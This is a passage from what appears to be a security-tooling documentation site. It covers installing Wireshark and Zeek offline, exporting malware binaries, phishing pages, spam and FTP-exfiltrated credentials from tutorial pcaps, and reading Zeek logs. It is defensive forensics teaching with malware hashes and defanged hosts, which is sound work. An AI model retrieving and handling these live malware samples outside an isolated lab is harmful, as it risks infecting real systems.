its dependencies: On an Ubuntu machine with internet access, use the following commands to download Wireshark and all its dependencies into the <code>wireshark-offline</code> folder.</p> <pre><code>sudo apt update\napt-get download wireshark\napt-cache depends wireshark | grep Depends | sed \"s/.*ends:\\ //\" | xargs apt-get download\napt-get download libminizip1 libqt5core5a libqt5gui5 libqt5multimedia5 libqt5printsupport5 libqt5widgets5 libwireshark15 libwiretap12 libwsutil13 wireshark-common libqt5svg5 libdouble-conversion3 libmd4c0 libqt5dbus5 libqt5network5 libxcb-xinerama0 libxcb-xinput0 libbcg729-0 libc-ares2 liblua5.2-0 libsmi2ldbl libsnappy1v5 libspandsp2 libwireshark-data libssh-gcrypt-4\n</code></pre> <p>Transfer the downloaded <code>.deb</code> files to your offline Ubuntu VM</p> <p>Install the dependencies: On your offline Ubuntu VM, navigate to the folder where you transferred the <code>.deb</code> files and run the following command:</p> <pre><code>sudo dpkg -i *.deb\n</code></pre> <p>Restart the PC and run Wireshark</p> <pre><code>wireshark\n</code></pre> <p></p>"},{"location":"wireshark/wireshark.html#malware-traffic-analysis","title":"Malware Traffic Analysis","text":"<p>The pcaps used in this tutorial are contained in a password-protected ZIP archive located at our\u00a0GitHub repository. Download the file named\u00a0Wireshark-tutorial-extracting-objects-5-pcaps.zip. Use\u00a0infected\u00a0as the password and extract the five pcaps, as shown below.</p> <p></p> <p>The five extracted pcaps are:</p> <ul> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-1-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-2-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-3-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-4-of-5.pcap</li> <li>Wireshark-tutorial-extracting-objects-from-a-pcap-5-of-5.pcap</li> </ul> <p>As a network packet analyser, Wireshark combines data from multiple IP packets and the associated TCP frames to reveal the content of a pcap. We can extract some of these objects revealed by Wireshark.</p>"},{"location":"wireshark/wireshark.html#exporting-files-from-http-traffic","title":"Exporting Files From HTTP Traffic","text":"<p>Some Windows-based infections involve malware binaries or malicious code sent over unencrypted HTTP traffic. We can extract these objects from the pcap. An example of this is found in our first pcap named\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-1-of-5.pcap. Open this pcap in Wireshark and filter on http.request as shown below.</p> <p></p> <p>After filtering on\u00a0http.request, find the two GET requests to\u00a0smart-fax[.]com. The first request ends with\u00a0.doc, indicating the first request may have returned a Microsoft Word document. The second request ends with\u00a0.exe, indicating the second request may have returned a Windows executable file. The HTTP GET requests are listed below.</p> <ul> <li>smart-fax[.]com - GET /Documents/Invoice&amp;MSO-Request.doc</li> <li>smart-fax[.]com - GET /knr.exe</li> </ul> <p>We can export these objects from the HTTP object list by using the menu path:</p> <ul> <li>File \u2192 Export Objects \u2192 HTTP...</li> </ul> <p>This menu path results in a window titled \u201cWireshark Export HTTP object list\u201d as shown below. Select the first line with Invoice&amp;MSO-Request.doc as the filename and save it. Select the second line with knr.exe as the filename and save it.</p> <p></p> <p>Note, the Content Type column from the HTTP object list shows what the server identified the file as in its HTTP response headers. In some cases, a server hosting malware will intentionally label Windows executables as a different type of file in an effort to avoid detection. Fortunately, the first pcap in this tutorial is a very straight-forward example.</p> <p>After extracting these files from the pcap, we should confirm the file types. </p> <p>In Windows, we can use PowerShell or Command Prompt command to obtain hash</p> <ul> <li>Get-FileHash [filename] -Algorithm SHA256</li> <li>certutil -hashfile [filename] SHA256</li> </ul> <p>In Linux, we can use a terminal window or command line interface (CLI) for the following commands:</p> <ul> <li>file\u00a0[filename]</li> <li>shasum -a 256\u00a0[filename]</li> </ul> <p>The\u00a0file\u00a0command identifies the type of file. The\u00a0shasum\u00a0command returns the file hash, in this case a SHA256 file hash.</p> <pre><code>\u2514\u2500$ file 'Invoice&amp;MSO-Request.doc' \nInvoice&amp;MSO-Request.doc: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.3, Code page: 1252, Template: Normal.dotm, Last Saved By: Administrator, Revision Number: 2, Name of Creating Application: Microsoft Office Word, Create Time/Date: Thu Jun 27 19:24:00 2019, Last Saved Time/Date: Thu Jun 27 19:24:00 2019, Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0\n\n\u2514\u2500$ shasum -a 256 'Invoice&amp;MSO-Request.doc' \nf808229aa516ba134889f81cd699b8d246d46d796b55e13bee87435889a054fb  Invoice&amp;MSO-Request.doc\n\n\u2514\u2500$ file knr.exe                  \nknr.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections\n\n\u2514\u2500$ shasum -a 256 knr.exe                  \n749e161661290e8a2d190b1a66469744127bc25bf46e5d0c6f2e835f4b92db18  knr.exe\n</code></pre> <p>The information above confirms our suspected Word document is in fact a Microsoft Word document. It also confirms the suspected Windows executable file is indeed a Windows executable. We can check the SHA256 hashes against VirusTotal to see if these files are detected as malware. We can also do an internet search on the SHA256 hashes to possibly find additional information.</p> <p>In addition to these Windows executables or other malware files, we can also extract webpages from unencrypted HTTP traffic.</p> <p>Use Wireshark to open our second pcap for this tutorial, Wireshark-tutorial-extracting-objects-from-a-pcap-2-of-5.pcap. This pcap contains traffic of someone entering login credentials on a fake PayPal login page.</p> <p>When reviewing network traffic from a phishing site, we might want to know what the phishing webpage actually looks like. We can extract the HTML pages, images and other web content using the Export HTTP object menu. In this case, we can extract and view just the initial HTML page. After extracting that initial HTML page, viewing it in a web browser should reveal the page shown below.</p> <p></p> <p></p> <p>Alternatively, your html might also look like below (same content).</p> <p></p> <p>Use this method with caution. If you extract malicious HTML code from a pcap and view it in a web browser, the HTML might call out to malicious domains, which is why we recommend doing this in an isolated test environment.</p>"},{"location":"wireshark/wireshark.html#exporting-files-from-smb-traffic","title":"Exporting Files from SMB Traffic","text":"<p>Some malware uses Microsoft's Server Message Block (SMB) protocol to spread across an Active Directory (AD)-based network. A banking Trojan known as Trickbot added a worm module\u00a0as early as July 2017\u00a0that uses an exploit based on\u00a0EternalBlue\u00a0to spread across a network over SMB. Trickbot is no longer an active malware family, but this section contains a June 2019 Trickbot infection that is ideal for this tutorial.</p> <p>Use Wireshark to open our third pcap for this tutorial,\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-3-of-5.pcap. This pcap contains a Trickbot infection from June 2019 where malware is sent over SMB traffic from an infected client to the domain controller.</p> <p>This pcap takes place in the following AD environment:</p> <ul> <li>Domain:\u00a0cliffstone[.]net</li> <li>Network segment:\u00a010.6.26[.]0\u00a0through\u00a010.6.26[.]255\u00a0(10.6.26[.]0/24)</li> <li>Domain controller IP:\u00a010.6.26[.]6</li> <li>Domain controller hostname:\u00a0CLIFFSTONE-DC</li> <li>Segment gateway:\u00a010.6.26[.]1</li> <li>Broadcast address:\u00a010.6.26[.]255</li> <li>Windows client:\u00a0QUINN-OFFICE-PC\u00a0at\u00a010.6.26[.]110</li> </ul> <p>In this pcap, a Trickbot infection uses SMB to spread from an infected client at\u00a010.6.26[.]110\u00a0to its domain controller at\u00a010.6.26[.]6. To see the associated malware, use the following menu path shown below:</p> <ul> <li>File \u2192 Export Objects \u2192 SMB...</li> </ul> <p>This brings up an Export SMB object list, listing the SMB objects we can export from the pcap as shown below.</p> <p></p> <p>Two entries near the middle of the list have\u00a0\\10.6.26[.]6\\C$\u00a0as the hostname. A closer examination of their respective filename fields indicates these are two Windows executable files. See Table below for details.</p> Packet Number Hostname Content Type Size Filename 7058 \\10.6.26[.]6\\C$ FILE (712704/712704) W [100.0%] 712 kB \\WINDOWS\\d0p2nc6ka3f_fixhohlycj4ovqfcy_smchzo_ub83urjpphrwahjwhv_o5c0fvf6.exe 7936 \\10.6.26[.]6\\C$ FILE (115712/115712) W [100.0%] 115 kB \\WINDOWS\\oiku9bu68cxqenfmcsos2aek6t07_guuisgxhllixv8dx2eemqddnhyh46l8n_di.exe <p>In the Content Type column, we need [100.00%] to export a correct copy of these files. Any number less than 100 percent indicates there was some data loss in the network traffic, resulting in a corrupt or incomplete copy of the file. These Trickbot-related files from the pcap have SHA256 file hashes as shown in Table.</p> <pre><code>PS C:\\Users\\Administrator\\Downloads&gt; Get-FileHash sample1.exe -Algorithm SHA256\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nSHA256          59896AE5F3EDCB999243C7BFDC0B17EB7FE28F3A66259D797386EA470C010040       C:\\Users\\Administrator\\Downlo...\n\nPS C:\\Users\\Administrator\\Downloads&gt; Get-FileHash sample2.exe -Algorithm SHA256\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nSHA256          CF99990BEE6C378CBF56239B3CC88276EEC348D82740F84E9D5C343751F82560       C:\\Users\\Administrator\\Downlo...\n</code></pre> SHA256 hash File size 59896ae5f3edcb999243c7bfdc0b17eb7fe28f3a66259d797386ea470c010040 712 kB cf99990bee6c378cbf56239b3cc88276eec348d82740f84e9d5c343751f82560 115 kB"},{"location":"wireshark/wireshark.html#exporting-emails-from-smtp-traffic","title":"Exporting Emails from SMTP Traffic","text":"<p>Certain types of malware are designed to turn an infected Windows host into a spambot. These spambot hosts send hundreds of spam messages or malicious emails every minute. If any of these messages are sent using unencrypted SMTP, we can export these messages from a pcap of the traffic.</p> <p>One such example is from our next pcap,\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-4-of-5.pcap. In this pcap, an infected Windows client sends\u00a0sextortion spam. This pcap contains five seconds of spambot traffic from a single infected Windows host.</p> <p>Open the pcap in Wireshark and filter on\u00a0smtp.data.fragment\u00a0as shown below. This should reveal 50 examples of subject lines in the Info column on our Wireshark column display.</p> <p></p> <p>We can export these messages using the following menu path as shown in Figure 12:</p> <ul> <li>File \u2192 Export Objects \u2192 IMF...</li> </ul> <p>IMF stands for\u00a0Internet Message Format, which is saved as a name with an\u00a0.eml\u00a0file extension.</p> <p></p> <p>The exported .eml files can be reviewed with a text editor or an email client like Outlook as shown below.</p> <p></p>"},{"location":"wireshark/wireshark.html#exporting-files-from-ftp-traffic","title":"Exporting Files from FTP Traffic","text":"<p>Some malware families use FTP during malware infections. Our next pcap contains malware executables retrieved from an FTP server. It also contains stolen information sent from the infected Windows host back to the same FTP server.</p> <p>Our final pcap for this tutorial is\u00a0Wireshark-tutorial-extracting-objects-from-a-pcap-5-of-5.pcap. Open the pcap in Wireshark and use the following filter:</p> <ul> <li>ftp.request.command\u00a0or\u00a0(ftp-data and tcp.seq eq 1)</li> </ul> <p>The results are shown below. We should see\u00a0USER\u00a0for the username and\u00a0PASS\u00a0for the password. This is followed by\u00a0RETR\u00a0statements, which are requests to retrieve files. The filtered results show\u00a0RETR\u00a0statements for the following files:</p> <ul> <li>RETR q.exe</li> <li>RETR w.exe</li> <li>RETR e.exe</li> <li>RETR r.exe</li> <li>RETR t.exe</li> </ul> <p></p> <p>This Wireshark filter also shows the start of files sent over the FTP data channel. After the\u00a0RETR\u00a0statements for the\u00a0.exe\u00a0files, our column display should reveal\u00a0STOR\u00a0statements representing store requests to send HTML-based log files back to the same FTP server approximately every 18 seconds.</p> <p>In Wireshark version 4.0.0 or newer, we can export files from the FTP data channel using the following menu path as shown in Figure 16:</p> <ul> <li>File \u2192 Export Objects \u2192 FTP-DATA...</li> </ul> <p>This brings up a Window listing the FTP data objects we can export as shown below. This lists all of the HTML files sent to the FTP server containing information stolen from the infected Windows host.</p> <p></p> <p>We can view the exported files in a text editor or a browser as shown below. These files contain login credentials from the infected host\u2019s email client and web browser.</p> <p></p> <p>While this export FTP-DATA function works for the\u00a0.html\u00a0files, it did not present us with any of the\u00a0.exe\u00a0files retrieved from the FTP server. We must export these using another method.</p> <p>This method involves finding the start of FTP data streams for each of the\u00a0.exe\u00a0files returned from the FTP server. To find these TCP frames, use the following Wireshark filter:</p> <ul> <li>ftp-data.command contains \".exe\" and tcp.seq eq 1</li> </ul> <p>The results are shown below, revealing an FTP data stream for each of the\u00a0.exe\u00a0files.</p> <p></p> <p>We can follow the TCP stream for each of the frames, and we can export these files from the TCP stream window. First, follow the TCP stream for the first result that shows (SIZE q.exe) in the Info column as shown below (right-click \u2192 Follow \u2192 TCP Stream)</p> <p></p> <p>The TCP stream window shows hints that this is a Windows executable or DLL file. The first two bytes are the ASCII characters MZ. The TCP stream also reveals the string This program cannot be run in DOS mode.</p> <p>But to confirm this is a Windows executable or DLL file, we must export it from the TCP stream. To do this, select \u201cRaw\u201d in the \"Show data as\" menu.</p> <p></p> <p>The TCP stream now shows the information in hexadecimal text, and we can export this raw data as a file using the \"Save as...\" button as shown above. This is an FTP data stream for a file named q.exe, and we have to manually type that when saving the file.</p> <p>When saving the file as q.exe in a Linux or similar CLI environment, we can confirm this is a Windows executable file and get the SHA256 hash using the commands shown below.</p> <pre><code>\u2514\u2500$ file q.exe  \nq.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections\n\n\u2514\u2500$ shasum -a 256 q.exe  \nca34b0926cdc3242bbfad1c4a0b42cc2750d90db9a272d92cfb6cb7034d2a3bd  q.exe\n</code></pre> <p>This SHA256 hash shows a\u00a0high detection rate as malware on VirusTotal. </p> <p></p> <p>Follow the same process to export the other\u00a0.exe\u00a0files in the pcap.</p> <pre><code>\u2514\u2500$ file w.exe\nw.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections\n\n\u2514\u2500$ file e.exe                    \ne.exe: PE32+ executable (GUI) x86-64, for MS Windows, 6 sections\n\n\u2514\u2500$ file r.exe\nr.exe: PE32+ executable (GUI) x86-64, for MS Windows, 6 sections\n\n\u2514\u2500$ file t.exe\nt.exe: PE32 executable (GUI) Intel 80386, for MS Windows, 4 sections\n\n\u2514\u2500$ shasum -a 256 w.exe\n08eb941447078ef2c6ad8d91bb2f52256c09657ecd3d5344023edccf7291e9fc  w.exe\n\n\u2514\u2500$ shasum -a 256 e.exe      \n32e1b3732cd779af1bf7730d0ec8a7a87a084319f6a0870dc7362a15ddbd3199  e.exe\n\n\u2514\u2500$ shasum -a 256 r.exe\n4ebd58007ee933a0a8348aee2922904a7110b7fb6a316b1c7fb2c6677e613884  r.exe\n\n\u2514\u2500$ shasum -a 256 t.exe\n10ce4b79180a2ddd924fdc95951d968191af2ee3b7dfc96dd6a5714dbeae613a  t.exe\n</code></pre> <p>This should give you the following files as shown below in Table</p> SHA256 hash Filename ca34b0926cdc3242bbfad1c4a0b42cc2750d90db9a272d92cfb6cb7034d2a3bd q.exe 08eb941447078ef2c6ad8d91bb2f52256c09657ecd3d5344023edccf7291e9fc w.exe 32e1b3732cd779af1bf7730d0ec8a7a87a084319f6a0870dc7362a15ddbd3199 e.exe 4ebd58007ee933a0a8348aee2922904a7110b7fb6a316b1c7fb2c6677e613884 r.exe 10ce4b79180a2ddd924fdc95951d968191af2ee3b7dfc96dd6a5714dbeae613a t.exe <p>These five .exe files are all Windows executables, and they all have a high detection rate as malware on VirusTotal.</p> <p>Wireshark does an excellent job of combining data from multiple IP packets and the associated TCP frames to show objects sent over unencrypted network traffic. Using the methods outlined in this tutorial, we can also use Wireshark to extract these objects from a pcap. This can be extremely helpful if you need to examine items during an investigation of suspicious activity.</p>"},{"location":"wireshark/wireshark.html#tshark","title":"TShark","text":"<p>TShark is a terminal oriented version of Wireshark designed for capturing and displaying packets when an interactive user interface isn\u2019t necessary or available.</p> <p>If a PCAP is larger than 500 MB, Wireshark will struggle to analyse. For example, if we are interested in the IP address 23.63.254.163, we can run a filter on Tshark and output it into another PCAP. We can then use Wireshark to read this new PCAP, which should be a manageable size.</p> <p>Open PowerShell and navigate to the directory where Wireshark is installed.</p> <p>Run <code>tshark.exe</code>, use the <code>-r</code> flag to point it to your PCAP of interest, use the <code>-w</code> flag to point to your output path including the new PCAP name, and specify the filter (e.g., <code>ip.addr == (value)</code>).</p> <pre><code>PS C:\\program files\\wireshark&gt; .\\tshark.exe -r C:\\Users\\Administrator\\Downloads\\Wireshark-tutorial-extracting-objects-5-pcaps\\Wireshark-tutorial-extracting-objects-from-a-pcap-1-of-5.pcap -w C:\\Users\\Administrator\\Downloads\\Wireshark-tutorial-extracting-objects-5-pcaps\\newdata.pcap ip.addr == 23.63.254.163\n</code></pre> <p></p> <p>This produces a new PCAP file of manageable size, filtering on the IP address 23.63.254.163.</p>"},{"location":"wireshark/wireshark.html#references","title":"References","text":"<ul> <li>https://unit42.paloaltonetworks.com/using-wireshark-exporting-objects-from-a-pcap/</li> <li>https://youtu.be/XZlasFStzqM?si=L0LHw4RODO8tgku8</li> <li>https://www.wireshark.org/docs/</li> </ul>"},{"location":"zeek/zeek.html","title":"Zeek","text":"<p>Zeek is an open-source network analysis framework and security monitoring tool. Zeek provides deep visibility into network traffic and enables organisations to detect and respond to security threats in real-time. Unlike traditional intrusion detection systems (IDS) that rely primarily on signature matching, Zeek offers a more flexible and comprehensive approach by analysing network behaviors and events.</p>"},{"location":"zeek/zeek.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, the Ubuntu host simulated a compromised machine by visiting non-malicious websites, such as testmyids.org and Reddit, with Reddit being treated as malicious to trigger alerts in a safe and controlled environment. To demonstrate Zeek to Suricata integration via PCAP files, Zeek was installed on the same host as Suricata.</p> Host OS Role IP Address Fortigate Fortios 7.6.0 Firewall/Router 192.168.1.111 (WAN) / 10.0.0.1 (LAN) Suricata Ubuntu 22.04 LTS Suricata and Zeek 10.0.0.27 <p></p>"},{"location":"zeek/zeek.html#install-zeek-offline","title":"Install Zeek offline","text":"<p>On an Ubuntu machine with internet connection:</p> <p>Make a folder called zeek-offline and change permission of the directory. </p> <pre><code>mkdir zeek-offline\ncd zeek-offline\nsudo chmod 755 ~/zeek-offline/\n</code></pre> <p>Add the Zeek repository and download the Zeek package and its dependencies:</p> <pre><code>echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_22.04/ /' | sudo tee /etc/apt/sources.list.d/security:zeek.list\ncurl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_22.04/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg &gt; /dev/null\nsudo apt update\nsudo apt-get install --download-only zeek \nsudo apt-get download zeek-core zeekctl zeek-core-dev zeek-spicy-dev zeek-zkg zeek-client \\\nlibbroker-dev libpcap-dev libssl-dev zlib1g-dev libmaxminddb-dev python3-semantic-version python3-git zeek-btest zeek-btest-data \\\nlibpcap0.8-dev libssl3=3.0.2-0ubuntu1.18 git python3-gitdb libc6-dev \\\nliberror-perl git-man libdbus-1-dev python3-smmap rpcsvc-proto libtirpc-dev \\\nlibc-dev-bin linux-libc-dev libcrypt-dev libnsl-dev pkg-config libdpkg-perl \\\nzeek-aux\n</code></pre> <p>Note: if you get a permission denied error, run the command again. </p> <p>Make a directory called curl and change permission of the directory. </p> <pre><code>mkdir curl\ncd curl\nsudo chmod 755 ~/curl/\n</code></pre> <p>Download curl and its dependencies.</p> <pre><code>sudo apt-get download curl libc6 libcurl4 zlib1g\n</code></pre> <p>Transferzeek-offline and curl to an Ubuntu host without internet access.</p> <p>Install curl:</p> <pre><code>cd curl-packages\nsudo dpkg -i *\n</code></pre> <p>Install Zeek:</p> <pre><code>cd zeek-offline\nsudo dpkg -i *\n</code></pre>"},{"location":"zeek/zeek.html#introduction-to-zeek","title":"Introduction to Zeek","text":""},{"location":"zeek/zeek.html#managing-zeek-with-zeekcontrol","title":"Managing Zeek with ZeekControl","text":"<p>ZeekControl is an interactive shell for easily operating/managing Zeek installations on a single system or even across multiple systems in a traffic-monitoring cluster.</p> <p>In\u00a0<code>/opt/zeek/etc/node.cfg</code>, set the right interface to monitor.</p> <p>For example:</p> <pre><code>nano /opt/zeek/etc/node.cfg\n</code></pre> <pre><code>[zeek]\ntype=standalone\nhost=localhost\ninterface=ens32   # change this according to your listening interface in ifconfig\n</code></pre> <p>[Optional but recommended]: In\u00a0<code>/opt/zeek/etc/networks.cfg</code>, add networks that Zeek will consider local to the monitored environment. More on this\u00a0below.</p> <p>[Optional]: In\u00a0<code>/opt/zeek/etc/zeekctl.cfg</code>, change the\u00a0<code>MailTo</code>\u00a0email address to a desired recipient and the\u00a0<code>LogRotationInterval</code>\u00a0to a desired log archival frequency.</p> <p>Now start the ZeekControl shell like:</p> <pre><code>cd /opt/zeek/bin\nsudo ./zeekctl\n</code></pre> <p>Since this is the first-time use of the shell, perform an initial installation of the ZeekControl configuration:</p> <pre><code>[ZeekControl] &gt; install\n</code></pre> <p>Then start up a Zeek instance:</p> <pre><code>[ZeekControl] &gt; start\n</code></pre> <p>There is another ZeekControl command,\u00a0<code>deploy</code>, that combines the above two steps and can be run after any changes to Zeek policy scripts or the ZeekControl configuration. Note that the\u00a0<code>check</code>\u00a0command is available to validate a modified configuration before installing it.</p> <pre><code>[ZeekControl] &gt; deploy\n</code></pre> <p>If there are errors while trying to start the Zeek instance, you can view the details with the\u00a0<code>diag</code>\u00a0command. If started successfully, the Zeek instance will begin analyzing traffic according to a default policy and output the results in\u00a0<code>/opt/zeek/logs/current</code> directory.</p> <p>You can leave it running for now, but to stop this Zeek instance you would do:</p> <pre><code>[ZeekControl] &gt; stop\n</code></pre> <p>Once Zeek is stopped, the log files in the\u00a0<code>/opt/zeek/logs/current</code>\u00a0directory are compressed and moved into the current day named folder inside the\u00a0<code>/opt/zeek/logs</code>\u00a0directory.</p>"},{"location":"zeek/zeek.html#browsing-log-files","title":"Browsing Log Files","text":"<p>By default, logs are written out in human-readable (ASCII) format and data is organized into columns (tab-delimited). Logs that are part of the current rotation interval are accumulated in\u00a0<code>/opt/zeek/logs/current/</code>\u00a0(if Zeek is not running, the directory will be empty). For example, the\u00a0<code>http.log</code>\u00a0contains the results of Zeek HTTP protocol analysis. Here are the first few columns of\u00a0<code>http.log</code>:</p> <pre><code># ts              uid              orig_h     orig_p   resp_h         resp_p\n1726175258.283795   ClWVdk6JZxaBGiba1   10.0.0.25    36768    91.189.91.48   80\n</code></pre> <p>Logs that deal with analysis of a network protocol will often start like this: a timestamp, a unique connection identifier (UID), and a connection 4-tuple (originator host/port and responder host/port). The UID can be used to identify and correlate all logged activity (possibly across multiple log files) associated with a given connection 4-tuple over its lifetime.</p> <p>The remaining columns of protocol-specific logs then detail the protocol-dependent activity that\u2019s occurring. E.g.\u00a0<code>http.log</code>\u2019s next few columns (shortened for brevity) show a request to the root of Zeek website:</p> <pre><code># method   host         uri  referrer  user_agent\nGET        zeek.org  /    -         &lt;...&gt;Chrome/12.0.742.122&lt;...&gt;\n</code></pre> <p>Apart from the conventional network protocol specific log files, Zeek also generates other important log files based on the network traffic statistics, interesting activity captured in the traffic, and detection focused log files. Some logs that are worth explicit mention:</p> <ul> <li> <p><code>conn.log</code></p> <p>Contains an entry for every connection seen on the wire, with basic properties such as time and duration, originator and responder IP addresses, services and ports, payload size, and much more. This log provides a comprehensive record of the network\u2019s activity.</p> </li> <li> <p><code>notice.log</code></p> <p>Identifies specific activity that Zeek recognises as potentially interesting, odd, or bad. In Zeek-speak, such activity is called a \u201cnotice\u201d.</p> </li> <li> <p><code>known_services.log</code></p> <p>This log file contains the services detected on the local network and are known to be actively used by the clients on the network. It helps in enumerating what all services are observed on a local network and if they all are intentional and known to the network administrator.</p> </li> <li> <p><code>weird.log</code></p> <p>Contains unusual or exceptional activity that can indicate malformed connections, traffic that doesn\u2019t conform to a particular protocol, malfunctioning or misconfigured hardware/services, or even an attacker attempting to avoid/confuse a sensor.</p> </li> </ul> <p>By default, ZeekControl regularly takes all the logs from\u00a0<code>/opt/zeek/logs/current</code>\u00a0and archives/compresses them to a directory named by date, e.g.\u00a0<code>/opt/zeek/logs/2021-01-01</code>. The frequency at which this is done can be configured via the\u00a0<code>LogRotationInterval</code>\u00a0option in\u00a0<code>/opt/zeek/etc/zeekctl.cfg</code>. The default is every hour.</p>"},{"location":"zeek/zeek.html#zeek-as-a-command-line-utility","title":"Zeek as a Command-Line Utility","text":"<p>If you prefer not to use ZeekControl (e.g., you don\u2019t need its automation and management features), here\u2019s how to directly control Zeek for your analysis activities from the command line for both live traffic and offline working from traces.</p>"},{"location":"zeek/zeek.html#monitoring-live-traffic","title":"Monitoring Live Traffic","text":"<p>Analysing live traffic from an interface is simple:</p> <pre><code>zeek -i ens32 &lt;list of scripts to load&gt;\n</code></pre> <p><code>ens32</code>\u00a0should be replaced by the interface on which you want to monitor the traffic. The standard base scripts will be loaded and enabled by default. A list of additional scripts can be provided in the command as indicated above by\u00a0<code>&lt;list\u00a0of\u00a0scripts\u00a0to\u00a0load&gt;</code>. Any such scripts supplied as space-separated files or paths will be loaded by Zeek in addition to the standard base scripts.</p> <p>Zeek will output log files into the current working directory.</p>"},{"location":"zeek/zeek.html#reading-packet-capture-pcap-files","title":"Reading Packet Capture (pcap) Files","text":"<p>When you want to do offline analysis of already captured pcap files, Zeek is a very handy tool to analyse the pcap and gives a high level holistic view of the traffic captured in the pcap.</p> <p>If you want to capture packets from an interface and write them to a file to later analyse it with Zeek, then it can be done like this:</p> <pre><code>sudo tcpdump -i ens32 -s 0 -w sample.pcap\n</code></pre> <p>Where\u00a0<code>ens32</code>\u00a0should be replaced by the correct interface for your system, for example as shown by the\u00a0ifconfig\u00a0command. (The\u00a0<code>-s\u00a00</code>\u00a0argument tells it to capture whole packets; in cases where it is not supported, use\u00a0<code>-s\u00a065535</code>\u00a0instead).</p> <p>After capturing traffic for a while, kill the tcpdump (with\u00a0ctrl-c), and tell Zeek to perform all the default analysis on the capture:</p> <pre><code>/opt/zeek/bin/zeek -r sample.pcap\n</code></pre> <p>Zeek will output log files into the current working directory. </p> <p>To specify the output directory for logs, you can set\u00a0<code>Log::default_logdir</code>\u00a0on the command line:</p> <pre><code>mkdir output_directory\n/opt/zeek/bin/zeek -r sample.pcap Log::default_logdir=output_directory\n</code></pre> <p>If no logs are generated for a pcap, try to run the pcap with\u00a0<code>-C</code>\u00a0to tell Zeek to ignore invalid IP Checksums:</p> <pre><code>/opt/zeek/bin/zeek \u2013C \u2013r sample.pcap\n</code></pre> <p>If you are interested in more detection, you can load the\u00a0<code>local.zeek</code>\u00a0script that is included as a suggested configuration:</p> <pre><code>zeek -r sample.pcap local\n</code></pre> <p>If you want to run a custom or an extra script (assuming it\u2019s in the default search path, more on this in the next section) to detect any particular behavior in the pcap, run Zeek with following command:</p> <pre><code>zeek \u2013r sample.pcap my-script.zeek\n</code></pre>"},{"location":"zeek/zeek.html#zeek-log-formats-and-inspection","title":"Zeek Log Formats and Inspection","text":"<p>Zeek creates a variety of logs when run in its default configuration. This data can be intimidating for a first-time user. In this section, we will process a sample packet trace with Zeek, and take a brief look at the sorts of logs Zeek creates. We will look at logs created in the traditional format, as well as logs in JSON format. We will also introduce a few command-line tools to examine Zeek logs.</p>"},{"location":"zeek/zeek.html#working-with-a-sample-trace","title":"Working with a Sample Trace","text":"<p>For the examples that follow, we will use Zeek on a Linux system to process network traffic captured and stored to disk. We saved this trace file earlier in packet capture (PCAP) format as\u00a0<code>sample.pcap</code>. The command line protocol analyser Tcpdump, which ships with most Unix-like distributions, summarises the contents of this file.</p> <pre><code>tcpdump -n -r sample.pcap\n</code></pre> <pre><code>reading from file sample.pcap, link-type EN10MB (Ethernet), snapshot length 262144\n16:29:30.278903 IP6 fe80::11bb:1eb2:4e66:8cb2.5353 &gt; ff02::fb.5353: 0 [2q] PTR (QM)? _ipp._tcp.local. PTR (QM)? _ipps._tcp.local. (45)\n16:29:30.279490 IP 10.0.0.20.5353 &gt; 224.0.0.251.5353: 0 [2q] PTR (QM)? _ipp._tcp.local. PTR (QM)? _ipps._tcp.local. (45)\n16:29:30.739547 IP 10.0.0.25.38596 &gt; 10.0.0.20.1514: Flags [.], seq 3895547640:3895549088, ack 1070210661, win 502, options [nop,nop,TS val 3662342600 ecr 1031616358], length 1448\n16:29:30.739583 IP 10.0.0.25.38596 &gt; 10.0.0.20.1514: Flags [P.], seq 1448:2350, ack 1, win 502, options [nop,nop,TS val 3662342600 ecr 1031616358], length 902\n16:29:30.740370 IP 10.0.0.20.1514 &gt; 10.0.0.25.38596: Flags [.], ack 2350, win 7056, options [nop,nop,TS val 1031618362 ecr 3662342600], length 0\n16:29:32.741070 IP 10.0.0.25.38596 &gt; 10.0.0.20.1514: Flags [P.], seq 2350:2652, ack 1, win 502, options [nop,nop,TS val 3662344602 ecr 1031618362], length 302\n16:29:32.742172 IP 10.0.0.20.1514 &gt; 10.0.0.25.38596: Flags [.], ack 2652, win 7056, options [nop,nop,TS val 1031620364 ecr 3662344602], length 0\n16:29:32.744648 IP 10.0.0.20.1514 &gt; 10.0.0.25.38596: Flags [P.], seq 1:90, ack 2652, win 7056, options [nop,nop,TS val 1031620366 ecr 3662344602], length 89\n...\n</code></pre> <p>Rather than run Zeek against a live interface, we will ask Zeek to digest this trace. This process allows us to vary Zeek\u2019s run-time operation, keeping the traffic constant.</p> <p>First we make two directories to store the log files that Zeek will produce. Then we will move into the \u201cdefault\u201d directory.</p> <pre><code>mkdir default\nmkdir json\ncd default/\n</code></pre>"},{"location":"zeek/zeek.html#zeek-tsv-format-logs","title":"Zeek TSV Format Logs","text":"<p>From this location on disk, we tell Zeek to digest the\u00a0<code>sample.pcap</code>\u00a0file.</p> <pre><code>zeek -C -r ../sample.pcap\n</code></pre> <p>The\u00a0<code>-r</code>\u00a0flag tells Zeek where to find the trace of interest.</p> <p>The\u00a0<code>-C</code>\u00a0flag tells Zeek to ignore any TCP checksum errors. This happens on many systems due to a feature called \u201cchecksum offloading,\u201d but it does not affect our analysis.</p> <p>Zeek completes its task without reporting anything to the command line. This is standard Unix-like behavior. Using the\u00a0ls\u00a0command we see what files Zeek created when processing the trace.</p> <pre><code>root@Suricata:/home/cyber/test_pcap/default# ls -al\ntotal 36\ndrwxr-xr-x 2 root root 4096 Sep 13 